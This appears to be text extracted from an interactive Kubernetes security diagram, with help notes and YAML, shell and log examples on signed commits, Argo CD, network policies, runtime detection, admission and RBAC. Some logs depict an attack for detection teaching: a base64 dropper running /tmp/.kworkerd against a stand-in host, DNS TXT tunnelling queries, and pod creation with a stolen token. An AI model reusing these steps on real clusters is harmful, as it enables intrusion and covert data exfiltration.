box-sizing: border-box; font-size: 0; text-align: center; color: #0A3D5A;
display: inline-block; font-size: 9px; font-family: Helvetica; color: light-dark(#0A3D5A, #9cc8e1); line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;

g.data-help:
Signed Git Commits
Git commits should be signed using a hardware security key (e.g., YubiKey) to ensure authenticity. ArgoCD can be configured to verify commit signatures before deployment.
g.data-tags: level-2 pri-2 SupplyChain SupplyChain.Git SupplyChain.Gitops SupplyChain.Signing _ _.Area _.Area.PlatformManagement
g.data-help.shell.verify_signed_commits:
# %G?: G = good signature, N = no signature $ git log --show-signature -1 v2.8.1 commit efd5ba101a47b45c2d1772da89f367b41b55f56b gpg: Signature made Wed Oct 7 09:02:11 2026 UTC gpg: using EDDSA key BD048F171C12A1F8F460AD7CD8ECCBB5C57BB3A7 gpg: Good signature from "Marte Dahl <mdahl@fjordmart.example>" [ultimate] Author: Marte Dahl <mdahl@fjordmart.example> Date: 2026-10-07 09:02:11 +0000
storefront: bump to 2.8.1 $ git log --format='%h %G? %GK %an %s' -2 7396c67 N Jonas Berg unsigned change efd5ba1 G D8ECCBB5C57BB3A7 Marte Dahl storefront: bump to 2.8.1
g.data-help.yaml.require_signed_commits: # Argo CD only syncs shop/deploy when every commit is signed by one of these GPG keys apiVersion: argoproj.io/v1alpha1 kind: AppProject metadata: name: shop namespace: argocd spec: sourceIntegrity: git: policies: - repos: - url: https://git.fjordmart.example/shop/deploy.git gpg: mode: strict keys: - D8ECCBB5C57BB3A7

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
git (application)
The git-forge (example gitlab, forgejo, ..), that the service-owner/developer uses can be hosted inside the same cluster. A good pattern is to keep this separate from the platform-git.

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Argocd (service owner)
To keep the argocd that deals with platform and infrastructure separate from application is good practice. The argocd that deploy the developer applications shoulnt have access to the service-accounts that handles cluster-wide and important resources.
g.data-help.yaml.restrict_team_project: # Team project: only its repo, only namespace shop, no cluster resources, no RBAC/quota/netpol apiVersion: argoproj.io/v1alpha1 kind: AppProject metadata: name: shop namespace: argocd spec: sourceRepos: - https://git.fjordmart.example/shop/deploy.git destinations: - server: https://kubernetes.default.svc namespace: shop clusterResourceWhitelist: [] namespaceResourceBlacklist: - group: rbac.authorization.k8s.io kind: Role - group: rbac.authorization.k8s.io kind: RoleBinding - group: "" kind: ResourceQuota - group: "" kind: LimitRange - group: networking.k8s.io kind: NetworkPolicy --- apiVersion: argoproj.io/v1alpha1 kind: Application metadata: name: shop namespace: argocd spec: project: shop source: repoURL: https://git.fjordmart.example/shop/deploy.git targetRevision: main path: overlays/k8s-prod destination: server: https://kubernetes.default.svc namespace: shop syncPolicy: automated: prune: true selfHeal: true

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Argocd (operator)
The argocd used by the platform team should be running on a separate cluster. It contains credentials with admin privileges to the cluster it manages. Thats why we run it outside the cluster, so nothing inside the cluster can access it.

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Git operator 2
For git operations that can have big impact, there should be "4-eyes" before the change is live. This can be done with protected branches, but also signing of the git-repo itself using tools like gittuf.
g.data-help.shell.require_two_signatures_w: # gittuf: changes to main need signatures from 2 of 3 people; every clone can verify it, not only the git forge $ gittuf policy add-person -k keys/policy --person-ID mdahl --public-key keys/mdahl.pub $ gittuf policy add-person -k keys/policy --person-ID jberg --public-key keys/jberg.pub $ gittuf policy add-person -k keys/policy --person-ID ihagen --public-key keys/ihagen.pub $ gittuf policy add-rule -k keys/policy --rule-name protect-main --rule-pattern git:refs/heads/main --authorize mdahl --authorize jberg --authorize ihagen --threshold 2 $ gittuf policy stage --local-only $ gittuf policy apply --local-only # main has a new commit signed only by mdahl $ gittuf verify-ref main Error: verifying Git namespace policies failed, gittuf policy verification failed
g.data-help.json.protect_main_branch: # Forgejo: no direct push to main, 2 approvals, signed commits, also for admins $ curl -X POST https://git.fjordmart.example/api/v1/repos/shop/deploy/branch_protections -H "Authorization: token $TOKEN" -H 'Content-Type: application/json' -d @- { "rule_name": "main", "enable_push": false, "required_approvals": 2, "dismiss_stale_approvals": true, "block_on_rejected_reviews": true, "block_on_outdated_branch": true, "require_signed_commits": true, "apply_to_admins": true }

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
Image Builder
The image builder produces trusted artifacts and must maintain verifiable build provenance. Each image should be linked to its source commit, build identity, SBOM, and resulting image digest.
Build provenance and attestations should be signed and stored in an append-only transparency log, such as Sigstore Rekor, allowing the origin and integrity of deployed images to be independently verified.
g.data-help.containerfile.multi_stage_nonr:
# syntax=docker/dockerfile:1 # Build in a Go image, ship only the static binary on distroless, running as UID 65532 FROM registry.fjordmart.example/base/go:1.24 AS build WORKDIR /src COPY go.mod go.sum ./ RUN --mount=type=cache,target=/go/pkg/mod go mod download COPY . . RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /out/storefront ./cmd/storefront
FROM registry.fjordmart.example/base/distroless-static:nonroot LABEL org.opencontainers.image.source="https://git.fjordmart.example/shop/storefront" LABEL org.opencontainers.image.version="2.8.1" USER 65532:65532 COPY --from=build /out/storefront /usr/local/bin/storefront EXPOSE 8080 ENTRYPOINT ["/usr/local/bin/storefront"]

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
User Namespace
Linux user namespaces isolate user and group identities between a container and the host.
UIDs and GIDs inside the namespace can be mapped to different IDs outside it. This allows UID 0 (root) inside a container to be mapped to an unprivileged UID on the host.
In Kubernetes, this isolation can be enabled for a pod using hostUsers: false, which automatically assigns and manages the UID/GID mapping.
This provides an additional isolation boundary and limits the privileges of container processes on the host.
g.data-help.shell.check_uid_mapping: # hostUsers: false: UID 0 in the container is UID 833617920 on the host $ kubectl exec -n shop storefront-6c9fd4d8b7-x2n4k -- cat /proc/self/uid_map 0 833617920 65536 # hostUsers: true (default): container UIDs are host UIDs $ kubectl exec -n shop cache-warmer -- cat /proc/self/uid_map 0 0 4294967295

ellipse.style: fill: light-dark(rgb(255, 122, 122), rgb(198, 84, 84)); stroke: light-dark(rgb(122, 20, 20), rgb(255, 183, 183));

g.data-help:
Virtual Machine Resources
The resources visible to the guest are virtual hardware provided by QEMU/KVM and configured through the VirtualMachine specification.
vCPUs are backed by QEMU execution threads scheduled on host CPUs, while virtual memory is backed by memory allocated to the virt-launcher pod. Virtual disks are typically backed by PVCs or DataVolumes, and virtual NICs are connected through the pod's networking or additional network attachments.
KubeVirt translates the VM configuration into the required pod resources, devices and runtime configuration. Kubernetes cgroups and resource limits therefore still control the underlying host resources available to the VM.

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
Other cluster nodes
Inter-node traffic may use direct IP-to-IP communication or be encapsulated, depending on the CNI configuration. Encryption can be applied at this level via service mesh (e.g., mTLS) or CNI-level encryption.
Certain workloads—such as ingress controllers, operators, or AI/ML jobs—should be scheduled on dedicated nodes using taints, tolerations, or node selectors to enforce separation and reduce security risk.
There can be many different types of nodes.

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
SBOM
A Software Bill of Materials (SBOM) provides a machine-readable inventory of the components and dependencies contained in an image.
It enables continuous vulnerability assessment, license tracking, and rapid identification of affected workloads when new vulnerabilities are discovered.
SBOMs should be generated during the build, associated with the image digest, and stored alongside the artifact using standards such as SPDX or CycloneDX.
g.data-help.shell.generate_sbom: # List what is in the image, then attach the SPDX SBOM to it as a signed attestation $ syft registry:registry.fjordmart.example/shop/storefront:2.8.1 -o spdx-json=storefront.spdx.json $ syft registry:registry.fjordmart.example/shop/storefront:2.8.1 NAME VERSION TYPE base-files 12.4+deb12u15 deb ca-certificates 20250419~deb12u1 deb media-types 10.0.0 deb netbase 6.4 deb stdlib go1.24.13 go-module tzdata 2026b-0+deb12u1 deb $ cosign attest --key hashivault://shop-images --type spdxjson --predicate storefront.spdx.json registry.fjordmart.example/shop/storefront@sha256:3c9e1f7a5b2d48e06a1c9f3b7d5e2a084f6c1b9d3e7a5f20c8b4d6e1a9f3c7b2

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
Provenance / Attestation
Provenance describes where an artifact came from and how it was produced, while attestations provide verifiable claims about the artifact and its build process.
Attestations can link an image digest to its source commit, build system, dependencies, SBOM, and security checks, creating a verifiable chain from source to deployment.
They should be cryptographically signed and verified before deployment, ensuring that only artifacts produced through trusted build processes are allowed to run.

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
Secure CNI (e.g., Cilium)
Use a CNI plugin that supports fine-grained network policies and visibility, such as Cilium with eBPF. Define a baseline deny-all policy and explicitly allow only required traffic.
Default Kubernetes network policies are namespace-scoped and may not cover all scenarios.
g.data-tags: level-3 pri-2 Node Node.Observability Network Network.Cni Node.Observability.Datapath _ _.Area _.Area.Cluster _.Area.NodeContext
g.data-help.log.dropped_flow: # Hubble flow: connection from cache-warmer to payments-proxy dropped by network policy $ hubble observe --pod shop/cache-warmer --verdict DROPPED Oct 14 03:44:02.118: shop/cache-warmer:51544 (ID:48211) <> shop/payments-proxy-7f9c6b5d48-q8zrt:443 (ID:31877) Policy denied DROPPED (TCP Flags: SYN)

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Network Observability (e.g., Hubble)
Deploy network observability tooling that can provide workload-aware visibility into network flows, policy verdicts, and DNS activity.
Retain flow telemetry centrally to enable historical correlation between network indicators and Kubernetes workloads during incident investigation.
Network observability complements network policy enforcement but does not replace it.
g.data-help.log.dns_flows: $ hubble observe --protocol dns Oct 14 03:48:14.309: shop/cache-warmer:47109 (ID:48211) -> kube-system/coredns-5d78c9869d-8hb2l:53 (ID:23714) dns-request proxy FORWARDED (DNS Query traqefpozb5337fb.t.cdnx.example. TXT) Oct 14 03:48:16.514: shop/cache-warmer:58260 (ID:48211) -> kube-system/coredns-5d78c9869d-8hb2l:53 (ID:23714) dns-request proxy FORWARDED (DNS Query traqefuldbgvatjj.t.cdnx.example. TXT) Oct 14 03:48:18.722: shop/cache-warmer:39874 (ID:48211) -> kube-system/coredns-5d78c9869d-8hb2l:53 (ID:23714) dns-request proxy FORWARDED (DNS Query traqef6xe7yh3wxh.t.cdnx.example. TXT)

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Runtime Security and Observability (e.g., Tetragon, Falco)
Use runtime security tooling to observe process execution, system calls, network connections, and other security-relevant activity inside workloads.
Correlate runtime events with Kubernetes metadata to identify which process, container, and workload caused suspicious activity.
Runtime visibility provides context that network telemetry alone cannot provide.

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Runtime Security (e.g., Tetragon)
Use eBPF-based runtime security to observe and control process execution, network activity, and other kernel-level behavior with Kubernetes workload context.
Tracing policies can provide targeted visibility and enforcement for security-sensitive runtime activity.
g.data-help.log.process_events: $ kubectl -n kube-system logs tetragon-p8x2z -c export-stdout | tetra getevents -o compact --pods cache-warmer 🚀 process shop/cache-warmer /bin/sh -c "echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA[…] | base64 -d > /tmp/.kworkerd && chmod +x /tmp/.kworkerd && /tmp/.kworkerd -d t.cdnx.example" 🚀 process shop/cache-warmer /usr/bin/base64 -d 💥 exit shop/cache-warmer /usr/bin/base64 -d 0 🚀 process shop/cache-warmer /usr/bin/chmod +x /tmp/.kworkerd 💥 exit shop/cache-warmer /usr/bin/chmod +x /tmp/.kworkerd 0 🚀 process shop/cache-warmer /tmp/.kworkerd -d t.cdnx.example

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Runtime Threat Detection (e.g., Falco)
Use runtime threat detection to identify suspicious behavior such as unexpected process execution, privilege changes, sensitive file access, and unusual network activity.
Tune detection rules to the expected behavior of workloads and forward alerts to a central security monitoring system.
g.data-help.yaml.dropped_binary_rule: - rule: Dropped binary executed in container desc: A process started from a file written after the container started condition: > spawned_process and container and proc.is_exe_upper_layer = true output: > Dropped binary executed (exe=%proc.exepath cmdline=%proc.cmdline user=%user.name pod=%k8s.ns.name/%k8s.pod.name image=%container.image.repository digest=%container.image.digest) priority: CRITICAL tags: [container, process, mitre_execution, TA0002]
g.data-help.json.dropped_binary_alert: $ kubectl -n falco logs falco-7tq9d -c falco | grep 'Dropped binary' | jq -S '{time, rule, priority, hostname, output_fields}' { "hostname": "worker-05", "output_fields": { "container.image.digest": "sha256:9d4bf569e737266d93655e630c601e8810000116f0681e70f489c347717bd590", "container.image.repository": "docker.io/library/debian", "evt.time": 1791949267512345678, "k8s.ns.name": "shop", "k8s.pod.name": "cache-warmer", "proc.cmdline": ".kworkerd -d t.cdnx.example", "proc.exepath": "/tmp/.kworkerd", "user.name": "root" }, "priority": "Critical", "rule": "Dropped binary executed in container", "time": "2026-10-14T03:41:07.512345678Z" }

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Node-Level Security
Some security controls operate at the Kubernetes node and Linux kernel level rather than inside individual pods or containers.
Node-level controls can provide visibility and enforcement across workloads, including network datapaths, process execution, system calls, and other kernel-observable activity.
g.data-help.shell.node_level_agents: # Node-level security agents run as DaemonSets: one pod per node $ kubectl get ds -A NAMESPACE NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE falco falco 11 11 11 11 11 <none> 212d kube-system cilium 11 11 11 11 11 kubernetes.io/os=linux 418d kube-system tetragon 11 11 11 11 11 <none> 212d

rect.style: fill: light-dark(rgb(223, 244, 255), rgb(15, 33, 42)); stroke: light-dark(rgb(11, 111, 164), rgb(86, 172, 218));

div.style: display: flex; align-items: unsafe center; justify-content: unsafe center; width: 12px; height: 1px; padding-top: 932px; margin-left: 748px;
box-sizing: border-box; font-size: 0; text-align: center; color: #0A3D5A;
display: inline-block; font-size: 12px; font-family: Helvetica; color: light-dark(#0A3D5A, #9cc8e1); line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;

g.data-help:
Security Logging and Monitoring
Kubernetes security-relevant logs should be collected centrally and forwarded to a remote logging or SIEM platform such as Splunk for monitoring, correlation, alerting, and long-term retention.
Important sources include Kubernetes API audit logs, control-plane component logs, kubelet and container runtime logs, authentication and authorization events, admission controller decisions, CNI/network security logs, and security events generated by runtime detection tools.
Kubernetes Audit Logging is particularly important because it records requests made to the Kubernetes API, including who performed an action, which resource was accessed or modified, and whether the request was allowed or denied.
Logs should be stored outside the cluster or otherwise protected from workloads and compromised nodes to prevent attackers from modifying or deleting security evidence.
g.data-help.yaml.audit_policy: # kube-apiserver --audit-policy-file: metadata for secrets/configmaps, full request/response for pod and RBAC changes apiVersion: audit.k8s.io/v1 kind: Policy omitStages: ["RequestReceived"] rules: - level: None users: ["system:kube-proxy"] verbs: ["watch"] - level: Metadata resources: - group: "" resources: ["secrets", "configmaps", "serviceaccounts/token"] - level: RequestResponse verbs: ["create", "patch", "update", "delete"] resources: - group: "" resources: ["pods", "pods/exec", "pods/ephemeralcontainers"] - group: "rbac.authorization.k8s.io" - level: Metadata

g.data-help:
Multi-interface (Multus)
A pod can have multiple network interfaces using the Multus CNI plugin. This allows attaching additional networks to a pod beyond the default CNI.
It is useful for scenarios like separating control and data planes, connecting to legacy networks, or assigning dedicated interfaces for specific protocols.

rect.style: fill: light-dark(rgb(223, 244, 255), rgb(15, 33, 42)); stroke: light-dark(rgb(11, 111, 164), rgb(86, 172, 218));

g.data-help:
Network interfaces (underlay)
Pods can use different types of network interfaces depending on requirements. Containers can bind directly to the host interface, or use other means to communicate over vlans and such.
Be aware: underlay networks (e.g., macvlan) typically bypass Kubernetes NetworkPolicies. Overlay networks used by most CNIs enforce policy as expected and are safer by default.

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Host Networking
hostNetwork is technically neither overlay nor underlay networking. The pod shares the node’s network namespace and uses the node’s interfaces and IP addresses directly instead of receiving a normal pod network namespace.
This reduces network isolation, may bypass normal pod-level NetworkPolicy enforcement depending on the CNI, and can expose node-local services, interfaces, and ports to the workload.
Host networking should therefore normally be restricted and only allowed when explicitly required.
It goes mostly in/out the same way as underlay.

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
NetworkPolicy Enforcement
NetworkPolicies are applied to pods, not Kubernetes Services. A policy selects pods using labels and controls the ingress and/or egress traffic allowed for those pods.
Enforcement happens on the pod network path and ultimately applies to traffic between pod IPs. This means the same policy applies whether traffic reaches a pod through a Service or connects directly to the pod IP.
Services may select the same pods for routing and load balancing, but they are not the enforcement point for NetworkPolicies.
g.data-help.yaml.allow_app_traffic: # Pods with app=storefront: in from ingress-nginx on 8080; out only to DNS and payments-proxy:443 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: storefront-allow namespace: shop spec: podSelector: matchLabels: app: storefront policyTypes: - Ingress - Egress ingress: - from: - namespaceSelector: matchLabels: kubernetes.io/metadata.name: ingress-nginx podSelector: matchLabels: app.kubernetes.io/name: ingress-nginx ports: - protocol: TCP port: 8080 egress: - to: - namespaceSelector: matchLabels: kubernetes.io/metadata.name: kube-system podSelector: matchLabels: k8s-app: kube-dns ports: - protocol: UDP port: 53 - protocol: TCP port: 53 - to: - podSelector: matchLabels: app: payments-proxy ports: - protocol: TCP port: 443

g.data-help:
Egress
Egress policies control outbound traffic from pods using label selectors and destination IPs or CIDRs. These rules help prevent unauthorized external access.
Some CNIs support assigning dedicated egress IPs per namespace or pod, enabling traceability and firewall integration for outbound traffic control.
Without an egress gateway, traffic leaves with the node IP (SNAT). A firewall on the way out then sees which node, not which pod or app: every pod on that node looks the same.
With a CiliumEgressGatewayPolicy, selected pods leave through gateway nodes with a fixed egress IP, so a firewall can tell apps apart.
The firewall / VLAN on the way out is optional (dashed): many clusters reach the outside without one.
g.data-help.yaml.fixed_egress_node: # Traffic from payments-proxy to outside the cluster leaves through nodes labelled egress-gateway apiVersion: cilium.io/v2 kind: CiliumEgressGatewayPolicy metadata: name: payments-proxy-egress spec: selectors: - podSelector: matchLabels: io.kubernetes.pod.namespace: shop app: payments-proxy destinationCIDRs: - 0.0.0.0/0 excludedCIDRs: - 10.0.0.0/8 egressGateway: nodeSelector: matchLabels: node-role.kubernetes.io/egress-gateway: ""

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
Traffic before filters
Traffic before reaching L7 filters (e.g., Envoy) is often encrypted with mTLS. This makes payload inspection impossible, but metadata such as SNI, client identity, or source IP can still be used to enforce context-aware ACLs.
Use this metadata to apply fine-grained policies even when the content is opaque.
g.data-tags: level-2 pri-2 Network Network.Ingress Network.Policy Network.Service Network.Service.EndpointSlice Network.Service.Port _ _.Area _.Area.Cluster _.Area.Deployment

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Traffic after filters
This is the raw, decrypted traffic that reaches the application after passing through L7 filters or service mesh proxies. At this point, the traffic is no longer encrypted and can be inspected or modified by sidecars or host-level tools before delivery to the application process.
Ensure that applications enforce their own validation and security controls, as traffic is now trusted and inside the protected boundary.
g.data-tags: level-2 pri-3 Network Network.Ingress Network.Policy Network.Cni _ _.Area _.Area.Cluster _.Area.Deployment _.Area.Pod

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
Internal API communication
The Kubernetes API should only be accessible to internal system components, operators, and pods that explicitly require it.
Use default-deny NetworkPolicies to block access by default, and only allow specific namespaces or service accounts to communicate with the API server. This minimizes the attack surface and enforces least privilege access.
g.data-help.yaml.api_server_only_for_label: # Every pod outside kube-system is denied the Kubernetes API, except pods that have the label api-access # (a deny rule wins over any allow, so namespace policies can't open it again) apiVersion: cilium.io/v2 kind: CiliumClusterwideNetworkPolicy metadata: name: api-server-only-for-labelled-pods spec: endpointSelector: matchExpressions: - key: io.kubernetes.pod.namespace operator: NotIn values: ["kube-system"] - key: api-access operator: DoesNotExist enableDefaultDeny: egress: false egressDeny: - toEntities: - kube-apiserver

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help:
Kubernetes objects
Everything in a cluster is an object created through the API: Deployments, Services, Secrets, NetworkPolicies, RBAC, custom resources. An object is desired state. Nothing runs just because it exists.
You typically create only a few objects yourself, with kubectl, GitOps, Helm or CI. Controllers create most of the others: a Deployment gets a ReplicaSet and the ReplicaSet gets Pods; a CronJob gets a new Job on every run and each Job gets Pods; an operator can turn one custom resource into many objects, cluster-scoped ones too.
Each of those objects is a new request to the API, made by the controller as itself. That is the feedback loop: one object leads to more, and every one of them is checked again. It is why Pod rules apply even if you only created a Deployment (the Pods are created later, by the replicaset-controller, and admission checks them then), and why a Deployment can exist while its Pods do not.

rect.style: fill: light-dark(rgb(223, 244, 255), rgb(15, 33, 42)); stroke: light-dark(rgb(11, 111, 164), rgb(86, 172, 218));

div.style: display: flex; align-items: unsafe center; justify-content: unsafe center; width: 24px; height: 1px; padding-top: 474px; margin-left: 1324px;
box-sizing: border-box; font-size: 0; text-align: center; color: #0A3D5A;
display: inline-block; font-size: 12px; font-family: Helvetica; color: light-dark(#0A3D5A, #9cc8e1); line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;

g.data-help:
Controllers
A controller is a program that watches objects through the API and works until the cluster matches them. This is the reconcile loop. kube-controller-manager runs the built-in ones (deployment-controller, replicaset-controller, cronjob-controller, job-controller, endpointslice-controller, ...). Operators such as cert-manager or Argo CD add their own.
A controller never writes to etcd and never creates anything directly. It sends ordinary API requests with its own identity, usually a ServiceAccount. Those requests go through authentication, RBAC and admission like any other. So a controller can only do what its RBAC allows, and admission policies (Pod Security Admission, Kyverno, Gatekeeper) still apply to what it creates. When a request is refused, nothing is created: the controller retries, and the reason shows up as events and in the status of the object it works on.
Security: controller ServiceAccounts are often powerful. Whoever can change the objects a controller acts on, or the controller itself, can make it create anything its RBAC allows.

g.data-help:
Pod Security Admission (PSA)
Pod Security Admission (PSA) enforces a baseline security level for pods in a namespace by validating pod specs at admission time (before the pod is created).
It uses namespace labels to apply standard Pod Security profiles (privileged, baseline, restricted) and can block insecure settings such as privileged containers, excessive Linux capabilities, unsafe host access, or other risky pod configurations.
PSA is an important preventive control for reducing attack surface and stopping insecure workloads before they are deployed.
g.data-help.yaml.enforce_baseline_warn_res: # Namespace labels: enforce baseline, only warn and audit on restricted apiVersion: v1 kind: Namespace metadata: name: shop labels: pod-security.kubernetes.io/enforce: baseline pod-security.kubernetes.io/enforce-version: v1.34 pod-security.kubernetes.io/warn: restricted pod-security.kubernetes.io/warn-version: v1.34 pod-security.kubernetes.io/audit: restricted pod-security.kubernetes.io/audit-version: v1.34
g.data-help.log.warning_on_create: # cache-warmer.yaml: a Pod running docker.io/library/debian as root, no securityContext $ kubectl --token="$STOLEN_TOKEN" create -f cache-warmer.yaml Warning: would violate PodSecurity "restricted:v1.34": allowPrivilegeEscalation != false (container "cache-warmer" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "cache-warmer" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "cache-warmer" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "cache-warmer" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost") pod/cache-warmer created

ellipse.style: fill: light-dark(rgb(255, 122, 122), rgb(198, 84, 84)); stroke: light-dark(rgb(122, 20, 20), rgb(255, 183, 183));

g.data-help:
ResourceQuota
ResourceQuota limits the total amount of cluster resources a namespace can consume (for example CPU, memory, storage, and object counts such as pods or services).
From a security and resilience perspective, quotas help reduce denial-of-service risk inside the cluster by preventing a single namespace or team from exhausting shared resources and impacting other workloads.
ResourceQuota is primarily a governance and availability control, but it also supports multi-tenancy and safer operations by enforcing usage bounds.
g.data-help.yaml.limit_namespace_resources: # Caps for namespace shop: total CPU/memory, number of pods, and no LoadBalancer/NodePort Services apiVersion: v1 kind: ResourceQuota metadata: name: shop-quota namespace: shop spec: hard: requests.cpu: "16" requests.memory: 32Gi limits.memory: 48Gi pods: "40" services.loadbalancers: "0" services.nodeports: "0"
g.data-help.shell.show_quota_usage: # Used vs. hard limit for each quota in the namespace $ kubectl describe quota -n shop Name: shop-quota Namespace: shop Resource Used Hard -------- ---- ---- limits.memory 4352Mi 48Gi pods 17 40 requests.cpu 3100m 16 requests.memory 2176Mi 32Gi services.loadbalancers 0 0 services.nodeports 0 0

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
LimitRange
LimitRange defines default and minimum/maximum resource requests and limits for containers and pods in a namespace (for example CPU and memory).
From a security and stability perspective, it helps prevent unsafe or unbounded workloads (such as containers with no limits) and improves cluster reliability by enforcing consistent resource settings.
LimitRange is mainly a stability and governance control, but it also supports safer multi-tenant operation by reducing resource abuse and misconfiguration.
g.data-help.yaml.default_container_limits: # Containers without requests/limits get these defaults; more than 2Gi memory is rejected apiVersion: v1 kind: LimitRange metadata: name: shop-defaults namespace: shop spec: limits: - type: Container defaultRequest: cpu: 100m memory: 128Mi default: memory: 256Mi max: memory: 2Gi
g.data-help.shell.show_limit_defaults: # Defaults applied to containers that set no requests/limits $ kubectl describe limitrange -n shop Name: shop-defaults Namespace: shop Type Resource Min Max Default Request Default Limit Max Limit/Request Ratio ---- -------- --- --- --------------- ------------- ----------------------- Container memory - 2Gi 128Mi 256Mi - Container cpu - - 100m - -

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.data-help:
Default ServiceAccount
Every namespace has a default ServiceAccount (unless automountServiceAccountToken=false), and pods use it automatically unless another ServiceAccount is explicitly configured. From a security perspective, this matters because unintended API access can be granted if the default account has permissions or if service account tokens are auto-mounted unnecessarily.
g.data-help.yaml.disable_token_automount: # Pods using the default ServiceAccount get no API token mounted apiVersion: v1 kind: ServiceAccount metadata: name: default namespace: shop automountServiceAccountToken: false

ellipse.style: fill: light-dark(rgb(255, 242, 166), rgb(45, 34, 0)); stroke: light-dark(rgb(182, 138, 0), rgb(156, 119, 0));

g.data-help.yaml.deny_all_traffic: # Selects every pod in shop; no rules means no traffic in or out apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: default-deny namespace: shop spec: podSelector: {} policyTypes: - Ingress - Egress
g.data-help:
Default deny NetworkPolicy
A namespace starts with no NetworkPolicy, and then every pod accepts traffic from everywhere in the cluster and can send traffic anywhere. A default-deny policy per namespace (an empty podSelector with policyTypes Ingress and Egress) flips that: only traffic that another policy allows gets through.
Add explicit allows on top: DNS to kube-dns, traffic from the ingress controller, and the few services each app needs. Without this, one compromised pod can reach every other pod and service in the cluster.

ellipse.style: fill: light-dark(rgb(255, 122, 122), rgb(198, 84, 84)); stroke: light-dark(rgb(122, 20, 20), rgb(255, 183, 183));

g.data-tags: level-2 pri-1 Namespace Api Api.Rbac Api.Rbac.Binding _ _.Area _.Area.Cluster _.Area.Namespace
g.data-help.yaml.team_edit_access: # Group shop-developers gets the built-in edit role, only in namespace shop apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: shop-developers-edit namespace: shop subjects: - kind: Group name: shop-developers apiGroup: rbac.authorization.k8s.io roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: edit
g.data-help.shell.check_team_permissions: # edit can exec into pods and add debug containers, but not change RBAC $ kubectl auth can-i create rolebindings -n shop --as=jberg@fjordmart.example --as-group=shop-developers no $ kubectl auth can-i create pods/exec -n shop --as=jberg@fjordmart.example --as-group=shop-developers yes $ kubectl auth can-i patch pods/ephemeralcontainers -n shop --as=jberg@fjordmart.example --as-group=shop-developers yes
g.data-help:
Team access with RoleBindings
Give teams access to their namespace with a RoleBinding to a Role or to a built-in ClusterRole such as edit or view. A RoleBinding only grants rights inside its own namespace, even when it points to a ClusterRole.
